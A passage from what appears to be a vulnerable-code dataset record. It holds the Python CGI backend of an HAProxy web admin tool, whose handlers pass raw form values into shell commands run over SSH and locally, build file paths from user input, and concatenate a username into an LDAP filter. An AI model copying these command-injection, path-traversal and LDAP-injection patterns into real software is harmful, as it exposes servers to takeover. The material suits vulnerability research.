DatetimeTickFormatter, DatePicker \tfrom bokeh.layouts import widgetbox, gridplot \tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select \timport pandas as pd \timport http.cookies \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \tservers=sql.select_waf_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp[serv]={} \t\tmetric=sql.select_waf_metrics(serv) \t\tmetrics={} \t\t \t\tfor i in metric: \t\t\trep_date=str(i[2]) \t\t\tmetrics[rep_date]={} \t\t\tmetrics[rep_date]['conn']=str(i[1]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_waf_out.html\", mode='inline') \t\t \t\tx_min=df.index.min() -pd.Timedelta(hours=1) \t\tx_max=df.index.max() +pd.Timedelta(minutes=1) \t\tp[serv]=figure( \t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\", \t\t\ttitle=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t \t\thover=HoverTool( \t\t\ttooltips=[ \t\t\t\t(\"Connections\", \"@conn\"), \t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['conn'].max()) +150 \t\tp[serv].add_tools(hover) \t\tp[serv].title.text_font_size=\"20px\"\t\t\t\t \t\tp[serv].line(\"Date\", \"conn\", source=source, alpha=0.5, color=' \t\tp[serv].legend.orientation=\"horizontal\" \t\tp[serv].legend.location=\"top_left\" \t\tp[serv].legend.padding=5 \t\t \tplots=[] \tfor key, value in p.items(): \t\tplots.append(value) \t\t \tgrid=gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location=\"left\", toolbar_options=dict(logo=None)) \tshow(grid) \t if form.getvalue('get_hap_v'): \toutput=funct.check_haproxy_version(serv) \tprint(output) \t if form.getvalue('bwlists'): \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists') \ttry: \t\tfile=open(list, \"r\") \t\tfile_read=file.read() \t\tfile.close \t\tprint(file_read) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read '+form.getvalue('color')+' list</div>') \t\t if form.getvalue('bwlists_create'): \tlist_name=form.getvalue('bwlists_create').split('.')[0] \tlist_name +='.lst' \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+list_name \ttry: \t\topen(list, 'a').close() \t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')+' list was created</div>') \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n create new '+form.getvalue('color')+' list. %s </div>' % e) \t\t if form.getvalue('bwlists_save'): \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists_save') \ttry: \t\twith open(list, \"w\") as file: \t\t\tfile.write(form.getvalue('bwlists_content')) \texcept IOError as e: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n save '+form.getvalue('color')+' list. %s </div>' % e) \t \tservers=sql.get_dick_permit() \tpath=sql.get_setting('haproxy_dir')+\"/\"+form.getvalue('color') \t \tfor server in servers: \t\tfunct.ssh_command(server[2],[\"sudo mkdir \"+path]) \t\terror=funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir='fullpath') \t\tif error: \t\t\tprint('<div class=\"alert alert-danger\">Upload fail: %s</div>' % error)\t\t\t \t\telse: \t\t\tprint('<div class=\"alert alert-success\" style=\"margin:10px\">Edited '+form.getvalue('color')+' list was uploaded to '+server[1]+'</div>') \t\t\tif form.getvalue('bwlists_restart')=='restart': \t\t\t\tfunct.ssh_command(server[2],[\"sudo \" +sql.get_setting('restart_command')]) \t\t\t if form.getvalue('get_lists'): \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color') \tlists=funct.get_files(dir=list, format=\"lst\") \tfor list in lists: \t\tprint(list) \t\t if form.getvalue('get_ldap_email'): \tusername=form.getvalue('get_ldap_email') \timport ldap \t \tserver=sql.get_setting('ldap_server') \tport=sql.get_setting('ldap_port') \tuser=sql.get_setting('ldap_user') \tpassword=sql.get_setting('ldap_password') \tldap_base=sql.get_setting('ldap_base') \tdomain=sql.get_setting('ldap_domain') \tldap_search_field=sql.get_setting('ldap_search_field') \tl=ldap.initialize(\"ldap://\"+server+':'+port) \ttry: \t\tl.protocol_version=ldap.VERSION3 \t\tl.set_option(ldap.OPT_REFERRALS, 0) \t\tbind=l.simple_bind_s(user, password) \t\tcriteria=\"(&(objectClass=user)(sAMAccountName=\"+username+\"))\" \t\tattributes=[ldap_search_field] \t\tresult=l.search_s(ldap_base, ldap.SCOPE_SUBTREE, criteria, attributes) \t\tresults=[entry for dn, entry in result if isinstance(entry, dict)] \t\ttry: \t\t\tprint('[\"'+results[0][ldap_search_field][0].decode(\"utf-8\")+'\",\"'+domain+'\"]') \t\texcept: \t\t\tprint('error: user not found') \tfinally: \t\tl.unbind() ", "sourceWithComments": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\"\nimport cgi\nimport os, sys\nimport funct\nimport sql\nimport ovw\n\nform = cgi.FieldStorage()\nserv = form.getvalue('serv')\nact = form.getvalue('act')\n\t\nprint('Content-type: text/html\\n')\n\nif act == \"checkrestart\":\n\tservers = sql.get_dick_permit(ip=serv)\n\tfor server in servers:\n\t\tif server != \"\":\n\t\t\tprint(\"ok\")\n\t\t\tsys.exit()\n\tsys.exit()\n\nif form.getvalue('token') is None:\n\tprint(\"What the fuck?! U r hacker Oo?!\")\n\tsys.exit()\n\t\t\nif form.getvalue('getcerts') is not None and serv is not None:\n\tcert_path = sql.get_setting('cert_path')\n\tcommands = [ \"ls -1t \"+cert_path+\" |grep pem\" ]\n\ttry:\n\t\tfunct.ssh_command(serv, commands, ip=\"1\")\n\texcept:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>')\n\nif form.getvalue('checkSshConnect') is not None and serv is not None:\n\ttry:\n\t\tfunct.ssh_command(serv, [\"ls -1t\"])\n\texcept:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>')\n\t\t\nif form.getvalue('getcert') is not None and serv is not None:\n\tid = form.getvalue('getcert')\n\tcert_path = sql.get_setting('cert_path')\n\tcommands = [ \"cat \"+cert_path+\"/\"+id ]\n\ttry:\n\t\tfunct.ssh_command(serv, commands, ip=\"1\")\n\texcept:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>')\n\t\t\nif form.getvalue('ssh_cert'):\n\tname = form.getvalue('name')\n\t\n\tif not os.path.exists(os.getcwd()+'/keys/'):\n\t\tos.makedirs(os.getcwd()+'/keys/')\n\t\n\tssh_keys = os.path.dirname(os.getcwd())+'/keys/'+name+'.pem'\n\t\n\ttry:\n\t\twith open(ssh_keys, \"w\") as conf:\n\t\t\tconf.write(form.getvalue('ssh_cert'))\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>')\n\telse:\n\t\tprint('<div class=\"alert alert-success\">Ssh key was save into: %s </div>' % ssh_keys)\n\ttry:\n\t\tfunct.logging(\"local\", \"users.py#ssh upload new ssh cert %s\" % ssh_keys)\n\texcept:\n\t\tpass\n\t\t\t\nif serv and form.getvalue('ssl_cert'):\n\tcert_local_dir = funct.get_config_var('main', 'cert_local_dir')\n\tcert_path = sql.get_setting('cert_path')\n\t\n\tif not os.path.exists(cert_local_dir):\n\t\tos.makedirs(cert_local_dir)\n\t\n\tif form.getvalue('ssl_name') is None:\n\t\tprint('<div class=\"alert alert-danger\">Please enter desired name</div>')\n\telse:\n\t\tname = form.getvalue('ssl_name') + '.pem'\n\t\n\ttry:\n\t\twith open(name, \"w\") as ssl_cert:\n\t\t\tssl_cert.write(form.getvalue('ssl_cert'))\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssl keys file. Check ssh keys path in config</div>')\n\telse:\n\t\tprint('<div class=\"alert alert-success\">SSL file was upload to %s into: %s </div>' % (serv, cert_path))\n\t\t\n\tMASTERS = sql.is_master(serv)\n\tfor master in MASTERS:\n\t\tif master[0] != None:\n\t\t\tfunct.upload(master[0], cert_path, name)\n\ttry:\n\t\tfunct.upload(serv, cert_path, name)\n\texcept:\n\t\tpass\n\t\n\tos.system(\"mv %s %s\" % (name, cert_local_dir))\n\tfunct.logging(serv, \"add.py#ssl upload new ssl cert %s\" % name)\n\t\nif form.getvalue('backend') is not None:\n\tfunct.show_backends(serv)\n\t\nif form.getvalue('ip') is not None and serv is not None:\n\tcommands = [ \"sudo ip a |grep inet |egrep -v  '::1' |awk '{ print $2  }' |awk -F'/' '{ print $1  }'\" ]\n\tfunct.ssh_command(serv, commands, ip=\"1\")\n\t\nif form.getvalue('showif'):\n\tcommands = [\"sudo ip link|grep 'UP' | awk '{print $2}'  |awk -F':' '{print $1}'\"]\n\tfunct.ssh_command(serv, commands, ip=\"1\")\n\t\nif form.getvalue('action_hap') is not None and serv is not None:\n\taction = form.getvalue('action_hap')\n\t\n\tif funct.check_haproxy_config(serv):\n\t\tcommands = [ \"sudo systemctl %s haproxy\" % action ]\n\t\tfunct.ssh_command(serv, commands)\t\t\n\t\tprint(\"HAproxy was %s\" % action)\n\telse:\n\t\tprint(\"Bad config, check please\")\n\t\nif form.getvalue('action_waf') is not None and serv is not None:\n\tserv = form.getvalue('serv')\n\taction = form.getvalue('action_waf')\n\n\tcommands = [ \"sudo systemctl %s waf\" % action ]\n\tfunct.ssh_command(serv, commands)\t\t\n\t\nif act == \"overview\":\n\tovw.get_overview()\n\t\nif act == \"overviewwaf\":\n\tovw.get_overviewWaf(form.getvalue('page'))\n\t\nif act == \"overviewServers\":\n\tovw.get_overviewServers()\n\t\nif form.getvalue('action'):\n\timport requests\n\tfrom requests_toolbelt.utils import dump\n\t\n\thaproxy_user = sql.get_setting('stats_user')\n\thaproxy_pass = sql.get_setting('stats_password')\n\tstats_port = sql.get_setting('stats_port')\n\tstats_page = sql.get_setting('stats_page')\n\t\n\tpostdata = {\n\t\t'action' : form.getvalue('action'),\n\t\t's' : form.getvalue('s'),\n\t\t'b' : form.getvalue('b')\n\t}\n\n\theaders = {\n\t\t'User-Agent' : 'Mozilla/5.0 (Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0',\n\t\t'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\n\t\t'Accept-Language' : 'en-US,en;q=0.5',\n\t\t'Accept-Encoding' : 'gzip, deflate'\n\t}\n\n\tq = requests.post('http://'+serv+':'+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass))\n\t\nif serv is not None and act == \"stats\":\n\timport requests\n\tfrom requests_toolbelt.utils import dump\n\t\n\thaproxy_user = sql.get_setting('stats_user')\n\thaproxy_pass = sql.get_setting('stats_password')\n\tstats_port = sql.get_setting('stats_port')\n\tstats_page = sql.get_setting('stats_page')\n\ttry:\n\t\tresponse = requests.get('http://%s:%s/%s' % (serv, stats_port, stats_page), auth=(haproxy_user, haproxy_pass)) \n\texcept requests.exceptions.ConnectTimeout:\n\t\tprint('Oops. Connection timeout occured!')\n\texcept requests.exceptions.ReadTimeout:\n\t\tprint('Oops. Read timeout occured')\n\texcept requests.exceptions.HTTPError as errh:\n\t\tprint (\"Http Error:\",errh)\n\texcept requests.exceptions.ConnectionError as errc:\n\t\tprint ('<div class=\"alert alert-danger\">Error Connecting: %s</div>' % errc)\n\texcept requests.exceptions.Timeout as errt:\n\t\tprint (\"Timeout Error:\",errt)\n\texcept requests.exceptions.RequestException as err:\n\t\tprint (\"OOps: Something Else\",err)\n\t\t\n\tdata = response.content\n\tprint(data.decode('utf-8'))\n\nif serv is not None and form.getvalue('rows') is not None:\n\trows = form.getvalue('rows')\n\twaf = form.getvalue('waf')\n\tgrep = form.getvalue('grep')\n\thour = form.getvalue('hour')\n\tminut = form.getvalue('minut')\n\thour1 = form.getvalue('hour1')\n\tminut1 = form.getvalue('minut1')\n\tdate = hour+':'+minut\n\tdate1 = hour1+':'+minut1\n\t\n\tif grep is not None:\n        \tgrep_act  = '|grep'\n\telse:\n\t\tgrep_act = ''\n\t\tgrep = ''\n\n\tsyslog_server_enable = sql.get_setting('syslog_server_enable')\n\tif syslog_server_enable is None or syslog_server_enable == \"0\":\n\t\tlocal_path_logs = sql.get_setting('local_path_logs')\n\t\tsyslog_server = serv\t\n\t\tcommands = [ \"sudo cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s  %s %s\" % (local_path_logs, date, date1, rows, grep_act, grep) ]\t\t\n\telse:\n\t\tcommands = [ \"sudo cat /var/log/%s/syslog.log | sed '/ %s:00/,/ %s:00/! d' |tail -%s  %s %s\" % (serv, date, date1, rows, grep_act, grep) ]\n\t\tsyslog_server = sql.get_setting('syslog_server')\n\t\n\tif waf == \"1\":\n\t\tlocal_path_logs = '/var/log/modsec_audit.log'\n\t\tcommands = [ \"sudo cat %s |tail -%s  %s %s\" % (local_path_logs, rows, grep_act, grep) ]\t\n\t\t\n\tfunct.ssh_command(syslog_server, commands, show_log=\"1\")\n\t\nif serv is not None and form.getvalue('rows1') is not None:\n\trows = form.getvalue('rows1')\n\tgrep = form.getvalue('grep')\n\thour = form.getvalue('hour')\n\tminut = form.getvalue('minut')\n\thour1 = form.getvalue('hour1')\n\tminut1 = form.getvalue('minut1')\n\tdate = hour+':'+minut\n\tdate1 = hour1+':'+minut1\n\tapache_log_path = sql.get_setting('apache_log_path')\n\t\n\tif grep is not None:\n\t\tgrep_act  = '|grep'\n\telse:\n\t\tgrep_act = ''\n\t\tgrep = ''\n\t\t\n\tif serv == 'haproxy-wi.access.log':\n\t\tcmd=\"cat %s| awk -F\\\"/|:\\\" '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s  %s %s\" % (apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep)\n\telse:\n\t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s  %s %s\" % (apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep)\n\n\toutput, stderr = funct.subprocess_execute(cmd)\n\n\tfunct.show_log(output)\n\tprint(stderr)\n\t\t\nif form.getvalue('viewlogs') is not None:\n\tviewlog = form.getvalue('viewlogs')\n\tlog_path = funct.get_config_var('main', 'log_path')\n\trows = form.getvalue('rows2')\n\tgrep = form.getvalue('grep')\n\thour = form.getvalue('hour')\n\tminut = form.getvalue('minut')\n\thour1 = form.getvalue('hour1')\n\tminut1 = form.getvalue('minut1')\n\tdate = hour+':'+minut\n\tdate1 = hour1+':'+minut1\n\t\n\tif grep is not None:\n\t\tgrep_act  = '|grep'\n\telse:\n\t\tgrep_act = ''\n\t\tgrep = ''\n\n\tcmd=\"cat %s| awk '$3>\\\"%s:00\\\" && $3<\\\"%s:00\\\"' |tail -%s  %s %s\" % (log_path + viewlog, date, date1, rows, grep_act, grep)\n\toutput, stderr = funct.subprocess_execute(cmd)\n\n\tfunct.show_log(output)\n\tprint(stderr)\n\t\t\nif serv is not None and act == \"showMap\":\n\tovw.get_map(serv)\n\t\nif form.getvalue('servaction') is not None:\n\tserver_state_file = sql.get_setting('server_state_file')\n\thaproxy_sock = sql.get_setting('haproxy_sock')\n\tenable = form.getvalue('servaction')\n\tbackend = form.getvalue('servbackend')\t\n\tcmd='echo \"%s %s\" |sudo socat stdio %s | cut -d \",\" -f 1-2,5-10,18,34-36 | column -s, -t' % (enable, backend, haproxy_sock)\n\t\n\tif form.getvalue('save') == \"on\":\n\t\tsave_command = 'echo \"show servers state\" | sudo socat stdio %s > %s' % (haproxy_sock, server_state_file)\n\t\tcommand = [ cmd, save_command ] \n\telse:\n\t\tcommand = [ cmd ] \n\t\t\n\tif enable != \"show\":\n\t\tprint('<center><h3>You %s %s on HAproxy %s. <a href=\"viewsttats.py?serv=%s\" title=\"View stat\" target=\"_blank\">Look it</a> or <a href=\"edit.py\" title=\"Edit\">Edit something else</a></h3><br />' % (enable, backend, serv, serv))\n\t\t\t\n\tfunct.ssh_command(serv, command, show_log=\"1\")\n\taction = 'edit.py ' + enable + ' ' + backend\n\tfunct.logging(serv, action)\n\nif act == \"showCompareConfigs\":\n\timport glob\n\tfrom jinja2 import Environment, FileSystemLoader\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'))\n\ttemplate = env.get_template('/show_compare_configs.html')\n\tleft = form.getvalue('left')\n\tright = form.getvalue('right')\n\t\n\ttemplate = template.render(serv=serv, right=right, left=left, return_files=funct.get_files())\t\t\t\t\t\t\t\t\t\n\tprint(template)\n\t\nif serv is not None and form.getvalue('right') is not None:\n\tfrom jinja2 import Environment, FileSystemLoader\n\tleft = form.getvalue('left')\n\tright = form.getvalue('right')\n\thap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n\tcmd='diff -ub %s%s %s%s' % (hap_configs_dir, left, hap_configs_dir, right)\t\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols', \"jinja2.ext.do\"])\n\ttemplate = env.get_template('compare.html')\n\t\n\toutput, stderr = funct.subprocess_execute(cmd)\n\ttemplate = template.render(stdout=output)\t\n\t\n\tprint(template)\n\tprint(stderr)\n\t\nif serv is not None and act == \"configShow\":\n\thap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n\t\n\tif form.getvalue('configver') is None:\t\n\t\tcfg = hap_configs_dir + serv + \"-\" + funct.get_data('config') + \".cfg\"\n\t\tfunct.get_config(serv, cfg)\n\telse: \n\t\tcfg = hap_configs_dir + form.getvalue('configver')\n\t\t\t\n\ttry:\n\t\tconf = open(cfg, \"r\")\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\">Can\\'t read import config file</div>')\n\t\t\n\tfrom jinja2 import Environment, FileSystemLoader\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'),extensions=['jinja2.ext.loopcontrols'])\n\ttemplate = env.get_template('config_show.html')\n\t\n\ttemplate = template.render(conf=conf, view=form.getvalue('view'), serv=serv, configver=form.getvalue('configver'), role=funct.is_admin(level=2))\t\t\t\t\t\t\t\t\t\t\t\n\tprint(template)\n\t\n\tif form.getvalue('configver') is None:\n\t\tos.system(\"/bin/rm -f \" + cfg)\t\n\t\t\nif form.getvalue('master'):\n\tmaster = form.getvalue('master')\n\tslave = form.getvalue('slave')\n\tinterface = form.getvalue('interface')\n\tvrrpip = form.getvalue('vrrpip')\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\tscript = \"install_keepalived.sh\"\n\t\n\tif form.getvalue('hap') == \"1\":\n\t\tfunct.install_haproxy(master)\n\t\tfunct.install_haproxy(slave)\n\t\t\n\tif form.getvalue('syn_flood') == \"1\":\n\t\tfunct.syn_flood_protect(master)\n\t\tfunct.syn_flood_protect(slave)\n\t\n\tos.system(\"cp scripts/%s .\" % script)\n\t\t\n\terror = str(funct.upload(master, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\t\tsys.exit()\n\tfunct.upload(slave, tmp_config_path, script)\n\n\tfunct.ssh_command(master, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip])\n\tfunct.ssh_command(slave, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip])\n\t\t\t\n\tos.system(\"rm -f %s\" % script)\n\tsql.update_server_master(master, slave)\n\t\nif form.getvalue('masteradd'):\n\tmaster = form.getvalue('masteradd')\n\tslave = form.getvalue('slaveadd')\n\tinterface = form.getvalue('interfaceadd')\n\tvrrpip = form.getvalue('vrrpipadd')\n\tkp = form.getvalue('kp')\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\tscript = \"add_vrrp.sh\"\n\t\n\tos.system(\"cp scripts/%s .\" % script)\n\t\t\n\terror = str(funct.upload(master, tmp_config_path, script))\n\tif error:\n\t\tprint('error: '+error)\n\t\tsys.exit()\n\tfunct.upload(slave, tmp_config_path, script)\n\t\n\tfunct.ssh_command(master, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"+interface+\" \"+vrrpip+\" \"+kp])\n\tfunct.ssh_command(slave, [\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" BACKUP \"+interface+\" \"+vrrpip+\" \"+kp])\n\t\t\t\n\tos.system(\"rm -f %s\" % script)\n\t\nif form.getvalue('haproxyaddserv'):\n\tfunct.install_haproxy(form.getvalue('haproxyaddserv'), syn_flood=form.getvalue('syn_flood'))\n\t\nif form.getvalue('installwaf'):\n\tfunct.waf_install(form.getvalue('installwaf'))\n\t\nif form.getvalue('metrics_waf'):\n\tsql.update_waf_metrics_enable(form.getvalue('metrics_waf'), form.getvalue('enable'))\n\t\t\nif form.getvalue('table_metrics'):\n\timport http.cookies\n\tfrom jinja2 import Environment, FileSystemLoader\n\tenv = Environment(loader=FileSystemLoader('templates/ajax'))\n\ttemplate = env.get_template('table_metrics.html')\n\t\t\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\t\n\ttable_stat = sql.select_table_metrics(user_id.value)\n\n\ttemplate = template.render(table_stat=sql.select_table_metrics(user_id.value))\t\t\t\t\t\t\t\t\t\t\t\n\tprint(template)\n\t\t\nif form.getvalue('metrics'):\n\tfrom datetime import timedelta\n\tfrom bokeh.plotting import figure, output_file, show\n\tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker\n\tfrom bokeh.layouts import widgetbox, gridplot\n\tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select\n\timport pandas as pd\n\timport http.cookies\n\t\t\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\t\n\tservers = sql.select_servers_metrics(user_id.value)\n\tservers = sorted(servers)\n\t\n\tp = {}\n\tfor serv in servers:\n\t\tserv = serv[0]\n\t\tp[serv] = {}\n\t\tmetric = sql.select_metrics(serv)\n\t\tmetrics = {}\n\t\t\n\t\tfor i in metric:\n\t\t\trep_date = str(i[5])\n\t\t\tmetrics[rep_date] = {}\n\t\t\tmetrics[rep_date]['server'] = str(i[0])\n\t\t\tmetrics[rep_date]['curr_con'] = str(i[1])\n\t\t\tmetrics[rep_date]['curr_ssl_con'] = str(i[2])\n\t\t\tmetrics[rep_date]['sess_rate'] = str(i[3])\n\t\t\tmetrics[rep_date]['max_sess_rate'] = str(i[4])\n\n\t\tdf = pd.DataFrame.from_dict(metrics, orient=\"index\")\n\t\tdf = df.fillna(0)\n\t\tdf.index = pd.to_datetime(df.index)\n\t\tdf.index.name = 'Date'\n\t\tdf.sort_index(inplace=True)\n\t\tsource = ColumnDataSource(df)\n\t\t\n\t\toutput_file(\"templates/metrics_out.html\", mode='inline')\n\t\t\n\t\tx_min = df.index.min() - pd.Timedelta(hours=1)\n\t\tx_max = df.index.max() + pd.Timedelta(minutes=1)\n\n\t\tp[serv] = figure(\n\t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\t\t\n\t\t\ttitle=metric[0][0],\n\t\t\tx_axis_type=\"datetime\", y_axis_label='Connections',\n\t\t\tx_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)\n\t\t\t)\n\t\t\t\n\t\thover = HoverTool(\n\t\t\ttooltips=[\n\t\t\t\t(\"Connections\", \"@curr_con\"),\n\t\t\t\t(\"SSL connections\", \"@curr_ssl_con\"),\n\t\t\t\t(\"Sessions rate\", \"@sess_rate\")\n\t\t\t],\n\t\t\tmode='mouse'\n\t\t)\n\t\t\n\t\tp[serv].ygrid.band_fill_color = \"#f3f8fb\"\n\t\tp[serv].ygrid.band_fill_alpha = 0.9\n\t\tp[serv].y_range.start = 0\n\t\tp[serv].y_range.end = int(df['curr_con'].max()) + 150\n\t\tp[serv].add_tools(hover)\n\t\tp[serv].title.text_font_size = \"20px\"\t\t\t\t\t\t\n\t\tp[serv].line(\"Date\", \"curr_con\", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend=\"Conn\")\n\t\tp[serv].line(\"Date\", \"curr_ssl_con\", source=source, alpha=0.5, color=\"#5d9ceb\", line_width=2, legend=\"SSL con\")\n\t\tp[serv].line(\"Date\", \"sess_rate\", source=source, alpha=0.5, color=\"#33414e\", line_width=2, legend=\"Sessions\")\n\t\tp[serv].legend.orientation = \"horizontal\"\n\t\tp[serv].legend.location = \"top_left\"\n\t\tp[serv].legend.padding = 5\n\n\tplots = []\n\tfor key, value in p.items():\n\t\tplots.append(value)\n\t\t\n\tgrid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = \"left\", toolbar_options=dict(logo=None))\n\tshow(grid)\n\t\nif form.getvalue('waf_metrics'):\n\tfrom datetime import timedelta\n\tfrom bokeh.plotting import figure, output_file, show\n\tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker\n\tfrom bokeh.layouts import widgetbox, gridplot\n\tfrom bokeh.models.widgets import Button, RadioButtonGroup, Select\n\timport pandas as pd\n\timport http.cookies\n\t\t\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\t\n\tservers = sql.select_waf_servers_metrics(user_id.value)\n\tservers = sorted(servers)\n\t\n\tp = {}\n\tfor serv in servers:\n\t\tserv = serv[0]\n\t\tp[serv] = {}\n\t\tmetric = sql.select_waf_metrics(serv)\n\t\tmetrics = {}\n\t\t\n\t\tfor i in metric:\n\t\t\trep_date = str(i[2])\n\t\t\tmetrics[rep_date] = {}\n\t\t\tmetrics[rep_date]['conn'] = str(i[1])\n\n\t\tdf = pd.DataFrame.from_dict(metrics, orient=\"index\")\n\t\tdf = df.fillna(0)\n\t\tdf.index = pd.to_datetime(df.index)\n\t\tdf.index.name = 'Date'\n\t\tdf.sort_index(inplace=True)\n\t\tsource = ColumnDataSource(df)\n\t\t\n\t\toutput_file(\"templates/metrics_waf_out.html\", mode='inline')\n\t\t\n\t\tx_min = df.index.min() - pd.Timedelta(hours=1)\n\t\tx_max = df.index.max() + pd.Timedelta(minutes=1)\n\n\t\tp[serv] = figure(\n\t\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\n\t\t\ttitle=metric[0][0],\n\t\t\tx_axis_type=\"datetime\", y_axis_label='Connections',\n\t\t\tx_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)\n\t\t\t)\n\t\t\t\n\t\thover = HoverTool(\n\t\t\ttooltips=[\n\t\t\t\t(\"Connections\", \"@conn\"),\n\t\t\t],\n\t\t\tmode='mouse'\n\t\t)\n\t\t\n\t\tp[serv].ygrid.band_fill_color = \"#f3f8fb\"\n\t\tp[serv].ygrid.band_fill_alpha = 0.9\n\t\tp[serv].y_range.start = 0\n\t\tp[serv].y_range.end = int(df['conn'].max()) + 150\n\t\tp[serv].add_tools(hover)\n\t\tp[serv].title.text_font_size = \"20px\"\t\t\t\t\n\t\tp[serv].line(\"Date\", \"conn\", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend=\"Conn\")\n\t\tp[serv].legend.orientation = \"horizontal\"\n\t\tp[serv].legend.location = \"top_left\"\n\t\tp[serv].legend.padding = 5\n\t\t\n\tplots = []\n\tfor key, value in p.items():\n\t\tplots.append(value)\n\t\t\n\tgrid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = \"left\", toolbar_options=dict(logo=None))\n\tshow(grid)\n\t\nif form.getvalue('get_hap_v'):\n\toutput = funct.check_haproxy_version(serv)\n\tprint(output)\n\t\nif form.getvalue('bwlists'):\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+form.getvalue('bwlists')\n\ttry:\n\t\tfile = open(list, \"r\")\n\t\tfile_read = file.read()\n\t\tfile.close\n\t\tprint(file_read)\n\texcept IOError:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n read '+form.getvalue('color')+' list</div>')\n\t\t\nif form.getvalue('bwlists_create'):\n\tlist_name = form.getvalue('bwlists_create').split('.')[0]\n\tlist_name += '.lst'\n\tlist = os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color')+\"/\"+list_name\n\ttry:\n\t\topen(list, 'a').close()\n\t\tprint('<div class=\"alert alert-success\" style=\"margin:0\">'+form.getvalue('color')+' list was created</div>')\n\texcept IOError as e:\n\t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Cat\\'n 